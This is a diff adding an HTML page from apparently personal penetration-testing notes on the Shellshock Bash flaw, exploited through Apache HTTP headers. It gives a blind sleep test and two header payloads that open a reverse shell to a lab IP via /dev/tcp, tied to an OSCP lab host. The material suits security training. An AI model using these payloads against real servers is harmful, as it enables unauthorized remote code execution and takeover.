@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Shellshock</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># Shellshock</h1></strong><br />Shellshock was a vulnerability found in 2014 where a flaw in the Bash shell&#39;s parser meant that commands appended to the end of environment variables would be executed, and an attacker could run arbitrary code.<br /><br /><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271</a><br /><br />Shellshock is acutally a collection of vulns, because it affects a bunch of different software.<br /><a href="https://github.com/mubix/shellshocker-pocs">https://github.com/mubix/shellshocker-pocs</a><br /><br /><strong><h2>## Apache Shellshock</h2></strong><br />Apache web server headers are often stored in environment variables. I have no idea why.<br />If the Linux host on which Apache is running is vulnerable to shellshock, you can exploit the machine by appending code to the end of HTTP request headers.<br /><br /><strong>Examples</strong><br />• oscp 10.11.1.71 - Alpha<br /><br /><strong><h3>### Test for Shellshock<br /></h3></strong><strong>#### with Nmap Script</strong><br /><a href="https://nmap.org/nsedoc/scripts/http-shellshock.html">https://nmap.org/nsedoc/scripts/http-shellshock.html</a><br /><br /><strong>#### Test for Blind Shellshock</strong><br />Some web servers won&#39;t return the output of your commands.<br />You can blindly test for Apache Shellshock code execution with <code>sleep</code><br /><code>User-Agent: () { :; }; sleep 10</code><br /><br />If the web server takes 10 seconds to respond, you know your code has executed and you&#39;ve found a Shellshock vulnerability.<br /><br /><strong><h3>### Exploit Manually</h3></strong><br />To exploit a Linux Shellshock vulnerability via Apache you simply have to append code to the end of a HTTP header.<br /><br />Nmap prefers to use the <code>User-Agent</code> header:<br /><code>() { :; }; &lt;command&gt;</code><br /><br />For example:<br /><code>User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.12/9001 0&gt;&amp;1</code><br /><br />You can even create your own header, and code execution will work:<br /><code>Test: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.12/9001 0&gt;&amp;1</code></div>
+</body>
+</html>
